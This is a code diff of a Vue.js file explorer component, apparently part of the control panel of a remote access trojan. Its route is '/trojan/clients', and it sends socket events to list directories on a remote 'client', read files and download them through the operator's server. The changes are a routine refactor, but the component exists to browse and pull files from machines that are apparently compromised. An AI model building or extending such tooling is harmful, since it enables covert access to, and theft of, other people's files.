@@ -1,5 +1,5 @@
 <template>
-  <div>
+  <!-- <div>
     <div>
       <v-container id="fileControlGroup" class="d-flex flex-column" dense>
         <v-container class="d-flex flex-column">
@@ -100,28 +100,114 @@
       :msg="msg"
       :template="contextMenu.template"
     ></context-menu>
-  </div>
+  </div> -->
+  <v-container>
+    <div class="d-flex justify-space-between mb-3">
+      <v-btn small fab @click="$router.go(-1)" class="mb-6 mr-5"
+        ><v-icon>fa-angle-left</v-icon></v-btn
+      >
+      <div class="d-flex ma-0 pa-0">
+        <p>排序方式</p>
+        <v-container class="d-flex"
+          ><v-menu offset-y>
+            <template v-slot:activator="{ on }">
+              <v-btn v-on="on" class="ml-3" small>{{ sortedBy.name }}</v-btn>
+            </template>
+            <v-list>
+              <v-list-item-group>
+                <v-list-item dense @click="sortedBy.name = '文件名'"
+                  ><v-list-item-content
+                    ><v-list-item-title
+                      >文件名</v-list-item-title
+                    ></v-list-item-content
+                  ></v-list-item
+                >
+                <v-list-item dense @click="sortedBy.name = '时间'"
+                  ><v-list-item-content
+                    ><v-list-item-title
+                      >时间</v-list-item-title
+                    ></v-list-item-content
+                  ></v-list-item
+                >
+                <v-list-item dense @click="sortedBy.name = '文件大小'"
+                  ><v-list-item-content
+                    ><v-list-item-title
+                      >文件大小</v-list-item-title
+                    ></v-list-item-content
+                  ></v-list-item
+                >
+              </v-list-item-group>
+            </v-list>
+          </v-menu>
+          <v-menu offset-y>
+            <template v-slot:activator="{ on }">
+              <v-btn v-on="on" class="ml-3" small>{{ sortedBy.type }}</v-btn>
+            </template>
+            <v-list>
+              <v-list-item-group>
+                <v-list-item dense @click="sortedBy.type = '升序'"
+                  ><v-list-item-content
+                    ><v-list-item-title
+                      >升序</v-list-item-title
+                    ></v-list-item-content
+                  ></v-list-item
+                >
+                <v-list-item dense @click="sortedBy.type = '降序'"
+                  ><v-list-item-content
+                    ><v-list-item-title
+                      >降序</v-list-item-title
+                    ></v-list-item-content
+                  ></v-list-item
+                >
+              </v-list-item-group>
+            </v-list>
+          </v-menu></v-container
+        >
+      </div>
+    </div>
+    <v-text-field
+      label="当前URL"
+      v-model="currentUrl"
+      dense
+      @keydown.enter="openDir(currentUrl)"
+    ></v-text-field>
+    <v-list style="overflow: auto; height: 63vh; user-select: none">
+      <v-list-item v-ripple @click="goBack">
+        <v-list-item-avatar>
+          <v-icon>fa-long-arrow-left</v-icon>
+        </v-list-item-avatar>
+        <v-list-item-content>
+          <v-list-item-title>返回上一级</v-list-item-title>
+        </v-list-item-content>
+      </v-list-item>
+      <template v-for="(file, index) in fileList">
+        <v-list-item :key="index" @click="openDir(file.name)" v-ripple>
+          <v-list-item-avatar>
+            <v-icon>{{ getExtCssObj(file.name).class }}</v-icon>
+          </v-list-item-avatar>
+          <v-list-item-content>
+            <v-list-item-title>{{ file.name }}</v-list-item-title>
+            <v-list-item-subtitle>{{
+              new Date(file.lstat.mtime).toLocaleString()
+            }}</v-list-item-subtitle>
+            <v-list-item-subtitle>{{
+              calcFileSize(file)
+            }}</v-list-item-subtitle>
+          </v-list-item-content>
+          <v-list-item-action @click="download(file.name)" v-if="!file.isDir">
+            <v-icon small>fa-download</v-icon>
+          </v-list-item-action>
+        </v-list-item>
+      </template>
+    </v-list>
+  </v-container>
 </template>
 
 <script>
-// const path = window.require("path");
-// import path from "path";
-// const { ipcRenderer } = window.require("electron");
-// const fs = window.require("fs");
 import path from "path-win32";
 import ContextMenuVue from "../../components/ContextMenu";
 import { SERVER_ADDRESS } from "../../../my_config";
 import EXT from "./ext.js";
-
-class util {}
-util.IdIndex = function (id) {
-  for (let i = 0; i < window.clientArr.length; i++) {
-    if (window.clientArr[i].id === id) {
-      return i;
-    }
-  }
-  return -1;
-};
 
 export default {
   name: "fileexplorer",
@@ -220,7 +306,7 @@ export default {
     //   that.download(fileUrl);
     // });
     // ipcRenderer.on("showfilecontent", (e, fileUrl) => {});
-    window.io.on("apilistdir", (result, url) => {
+    this.$store.state.io.on("apilistdir", (result, url) => {
       // console.log(result);
       if (result.length) {
         // console.log(result);
@@ -235,14 +321,14 @@ export default {
     //   console.log(666);
     //   // stream.pipe(fs.createWriteStream("C:\\ProgramData\\nssm\\testbili123"));
     // });
-    window.io.on("apidownloadfile", (fileName) => {
+    this.$store.state.io.on("apidownloadfile", (fileName) => {
       window.open(`${SERVER_ADDRESS}:7071/tmpDir/${fileName}`);
     });
-    window.io.on("apishowfilecontent", (raw) => {});
+    this.$store.state.io.on("apishowfilecontent", (raw) => {});
     this.id = this.$route.query.id;
 
     this.interval = setInterval(() => {
-      if (util.IdIndex(this.id) == -1) {
+      if (this.$myUtils.IdIndex(window.clientArr, this.id) == -1) {
         clearInterval(this.interval);
         // alert("此客户端已离线");
         this.$router.push("/trojan/clients");
@@ -378,25 +464,25 @@ export default {
     },
     goBack() {
       this.currentUrl = path.resolve(this.currentUrl, "..");
-      window.io.emit("apilistdir", this.id, this.currentUrl);
+      this.$store.state.io.emit("apilistdir", this.id, this.currentUrl);
     },
     openDir(target) {
       let toUrl = path.resolve(this.currentUrl, target);
       // console.log(toUrl);
-      window.io.emit("apilistdir", this.id, toUrl);
+      this.$store.state.io.emit("apilistdir", this.id, toUrl);
     },
     download(target) {
       let that = this;
       const fileUrl = path.resolve(this.currentUrl, target);
-      window.io.emit("apidownloadfile", that.id, fileUrl);
+      this.$store.state.io.emit("apidownloadfile", that.id, fileUrl);
     },
     showFileContent(target) {
-      window.io.emit("apishowfilecontent", this.id, target);
+      this.$store.state.io.emit("apishowfilecontent", this.id, target);
     },
     showDetails() {},
   },
   components: {
-    "context-menu": ContextMenuVue,
+    // "context-menu": ContextMenuVue,
   },
 };
 </script>
